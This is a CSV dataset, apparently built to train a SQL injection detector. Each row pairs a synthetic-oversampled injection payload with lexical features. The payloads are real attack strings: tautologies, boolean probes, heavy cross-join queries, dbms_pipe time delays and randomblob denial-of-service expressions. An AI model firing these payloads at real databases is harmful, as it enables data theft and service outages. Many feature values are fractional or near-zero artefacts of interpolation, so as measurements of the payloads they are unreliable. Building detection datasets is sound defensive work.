id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000128,attack,boolean,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000015,0.03263478361541194,63.0,22.017852899714846,3.3721821683680324,24.0,4.982147100285152,26.0,8.017852899714848,0.38095238095238093,0.07908170000452622,0.4126984126984127,0.12726750634468012,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,2.0,0.9821471002851521,-1.1102230246251565e-16,2.220446049250313e-16,5.017852899714848,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000129,attack,boolean,"1'  )   as ezoa where 4915  =  4915 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000695,0.2820162694105257,149.76973072425807,32.67459467109678,4.133325252145861,72.04756802658065,18.0,40.047568026580656,19.674594671096777,0.48108894733804564,0.12038983360796511,0.267062576479441,0.13145864257454828,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.674594671096775,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000130,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000362,0.3657158339035163,147.01034604018395,32.46233431078338,4.117441216002369,70.77400586470029,18.0,38.77400586470028,19.46233431078338,0.48146040785623245,0.12267724837785249,0.26336752185116136,0.13249482191475367,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.46233431078338,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000131,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000664,0.2951212440693741,125.49722000493983,29.23562117588943,3.9001324212003627,53.0,14.0,42.35065176877398,16.14656823616585,0.42410079953893903,0.11202662629330463,0.33541339720102137,0.12845917696673498,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,9.146568236165853,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,boolean,"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000180,1.283171099312222,158.9710616214554,30.59855308107277,3.9329328600642866,74.59855308107277,8.59855308107277,53.379743135018785,22.394212324291082,0.47090018912908865,0.054104803044769806,0.3343567749351203,0.14063823289102126,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.19710616214554,1.9999999999999998,-1.1102230246251565e-16,2.5985530810727706,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.5985530810727702,0.4014469189272297,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000133,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000653,0.32582465050743026,91.14523479661065,21.35892609745799,2.9678168581695514,12.252080447034317,13.0,48.0,17.89315434957633,0.13383842504803553,0.14274222925000796,0.5270482310769525,0.19637111462500398,4.0,0.0,0.0,-1.3877787807814457e-17,0.10684565042366889,2.0,0.0,8.0,1.9999999999999998,0.8931543495763312,0.8931543495763312,2.106845650423669,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",nearest_attack_euclidean,R000581,1.3845111778679748,132.92452432321585,35.0,3.7475226024811676,46.0,12.311310808039611,55.613213515176234,19.0,0.3460804998378602,0.09248347938879864,0.4184897273620511,0.1429462934112901,2.0,3.462262161607922,0.0,1.0,0.0,1.0,0.0,10.53773783839208,0.0,-1.1102230246251565e-16,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.5377378383920779,0.0,0.0,0.0,1.0,0.4622621616079222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,boolean,"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R000161,0.2826212581491436,160.08016197699402,36.16724327691018,3.978902821314917,54.247405253904205,23.0,58.83275672308982,24.0,0.33869247772852606,0.14373317906952948,0.367591895477218,0.14998244772472644,6.0,0.0,0.0,1.0,0.0,2.0,0.0,10.0,0.0,-1.1102230246251565e-16,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.9163783615449113,0.9163783615449113,0.08362163845508869,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9163783615449113
SMOTE_000136,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000219,0.38340015616995116,140.14702018468384,34.37764242216206,4.262584236817238,64.50352322954942,15.0,41.26585453297236,19.37764242216206,0.46118650944527817,0.10736211125663433,0.2931282456436219,0.13832313365446558,4.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.8741191926126466,0.0,4.503523229549414,0.0,-1.1102230246251565e-16,2.220446049250313e-16,5.874119192612646,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000137,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",nearest_attack_euclidean,R000202,0.39264435868207626,129.1810741752208,26.515089514601733,3.9082762161054547,76.60562660221214,3.0,35.06035805840693,14.515089514601733,0.5930306327781375,0.02327351866753012,0.2712706168865864,0.11242523166774597,0.0,3.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.515089514601733,0.0,-1.1102230246251565e-16,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,boolean,"1  )   as otsb where 8380  =  8380 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000471,0.4091694452830698,154.1595816035102,34.52125518946943,3.9080615529856666,47.15958160351019,24.0,58.0,25.0,0.30591014795038085,0.15568370513262486,0.37623562073717676,0.16217052617981756,0.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.15958160351019157,0.8404183964898082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000168,0.13338752351482458,78.82749376931963,25.884995846213084,3.5392730221497457,16.827493769319624,21.0,32.0,9.0,0.2134084966185571,0.26642615437113387,0.4059827114226802,0.11418263758762881,0.0,0.0,2.0,-1.3877787807814457e-17,0.057502076893458376,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,0.9424979231065417,4.057502076893458,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.1322402963680489,137.22717745654762,36.22717745654763,3.868660419903491,42.22717745654763,23.0,53.943205635863094,18.056794364136906,0.307686589965938,0.16761272032403604,0.39312272037374707,0.13157796933627888,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.056794364136906,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.05679436413690653,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0567943641369064
SMOTE_000141,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000574,0.6368414383352169,132.7516728438921,29.2550185316763,3.903421590011781,62.7516728438921,10.0,40.0,20.0,0.47269407035044697,0.07532941852136472,0.30131767408545884,0.15065883704272942,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.7516728438920997,0.24832715610790035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000142,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000364,0.7039731076113676,142.31691615855667,30.0,4.022863797322281,82.31691615855665,8.0,38.0,14.0,0.5782515584497484,0.056233125540033554,0.26710734631515937,0.09840796969505872,1.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.2805139735738903,0.7194860264261096,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,boolean,"1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000100,0.6233658095044108,126.0,29.58534424348773,4.004049935309256,62.79267212174386,10.0,34.0,19.207327878256134,0.49835454064876084,0.07936507936507936,0.2698412698412698,0.15243911014488995,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.2073278782561347,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.7926721217438651,0.2073278782561347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,boolean,"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",nearest_attack_euclidean,R000120,0.00013234264790997562,160.9988603611391,31.00008140277578,3.899580959788527,79.0,8.0,54.999023166690655,18.999837194448443,0.490687033906706,0.04968982621840061,0.3416109101269508,0.11801222974794255,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.999837194448442,0.0,-1.1102230246251565e-16,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000145,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,nearest_attack_euclidean,R000591,0.017800450640756634,137.0,26.922138000242853,3.3109440820475493,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000146,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000737,0.040149903838563636,136.06027352535693,36.06027352535694,3.884671533601337,42.0,23.0,54.0,17.060273525356944,0.3086876616538755,0.1690432432866461,0.3968841364121256,0.12538495864735275,2.060273525356943,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000147,attack,boolean,"1 where 3737  =  3737 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000734,0.01465985534691905,136.0,32.0,4.225739201279208,69.0,16.0,37.0,14.0,0.5073529411764706,0.11764705882352941,0.27205882352941174,0.10294117647058823,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000148,attack,boolean,"-3828%""   )    )     )   or make_set  (  1765  =  8657,8657  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000091,1.2247967666989392,85.43841349403657,22.674230780534458,2.989757690423838,9.08995193296765,14.337115390267229,44.67423078053446,17.33711539026723,0.1026731683777029,0.167691717276433,0.5261707714089208,0.20346434293694327,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,7.1685576951336145,1.9999999999999998,0.584278847566807,0.5842788475668073,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000149,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000162,0.6680355243839932,65.25172889872094,22.12586444936047,3.4904703764541436,11.18879667404071,21.0,25.062932224680235,8.0,0.16928077118715032,0.32304910741906867,0.3846037947579453,0.1230663266358357,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,3.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000452,0.07487837734316108,69.0,22.66018349049068,3.4944512628662556,13.0,16.0,28.0,12.0,0.18840579710144928,0.2318840579710145,0.4057971014492754,0.17391304347826086,4.0,0.0,1.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000173,0.08812455766834959,142.41248025235248,29.06345850036192,3.9925708037140426,67.25383400144769,16.03172925018096,45.06345850036192,14.063458500361921,0.47221300551103834,0.11258091183498667,0.3164674918534998,0.09873859080047515,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.0317292501809607,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0317292501809605,0.9682707498190394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000152,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'vjdk' like 'vjdk",nearest_attack_euclidean,R000545,0.1105926377232454,134.87495711087357,30.88461098573062,4.259188015264193,82.84610985730622,4.115389014269377,33.0,14.913458239297967,0.6129149896361633,0.030942471004937952,0.2454613716905073,0.11068116766839145,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.0576945071346895,0.0,0.028847253567344522,2.9423054928653114,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000153,attack,boolean,"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000525,0.49410337503239893,150.38886919174922,32.7824057659791,4.143254975873203,72.69443459587461,18.0,40.69443459587462,19.0,0.4833575382644682,0.11982572449582876,0.27033402804966156,0.12648270919004148,0.2175942340208974,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.782405765979103,0.0,5.0,4.0,5.0,0.2175942340208975,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000154,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R000512,0.8018578366427678,129.4366907048539,27.62070913467416,3.4293120366879446,42.0,13.0,59.51716346130335,14.919527243550558,0.32542038991134864,0.1007253587820841,0.45866891031263435,0.11518534099393293,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,8.919527243550558,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000155,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000642,0.2503214966181216,127.88446067517951,31.0,4.040587636483511,64.0,8.0,39.18668057872529,16.697780096454213,0.5007751417628838,0.06259689272036048,0.3060666408725408,0.1305613246442149,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.697780096454215,1.0,-1.1102230246251565e-16,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,boolean,"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R000529,0.6062386652497307,164.2407988675783,32.481597735156555,4.081959399221059,77.24079886757828,18.0,47.0,22.0,0.4702863821684889,0.10959592093065747,0.28616712687449447,0.13395057002635913,2.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,0.24079886757827718,0.7592011324217227,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
